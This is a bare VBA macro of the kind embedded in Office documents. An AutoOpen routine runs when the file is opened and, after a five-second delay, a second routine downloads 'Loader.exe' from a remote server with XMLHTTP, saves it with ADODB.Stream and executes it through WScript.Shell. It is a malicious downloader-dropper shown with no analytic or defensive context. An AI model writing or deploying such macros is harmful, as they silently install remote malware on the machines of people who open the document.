Sub AutoOpen()
    Dim startTime As Date
    startTime = Now
    Application.OnTime Now + TimeValue("00:00:05"), "DelayedExecution"
End Sub

Sub DelayedExecution()
    Dim endTime As Date
    endTime = Now
    Dim elapsedTime As Double
    elapsedTime = DateDiff("s", startTime, endTime)
    If elapsedTime > 4 Then
        Dim url As String
        url = "http://serverdomain/Loader.exe"
        Dim fileName As String
        fileName = "Loader.exe"
        Dim httpReq As Object
        Set httpReq = CreateObject("Msxml2.XMLHTTP")
        httpReq.Open "GET", url, False
        httpReq.send
        If httpReq.Status = 200 Then
            Dim oStream As Object
            Set oStream = CreateObject("ADODB.Stream")
            oStream.Open
            oStream.Type = 1
            oStream.Write httpReq.responseBody
            oStream.SaveToFile fileName, 2
            oStream.Close
            Set oStream = Nothing
            Dim proc As Object
            Set proc = CreateObject("WScript.Shell")
            proc.Run fileName
            Set proc = Nothing
        End If
        Set httpReq = Nothing
    End If
End Sub



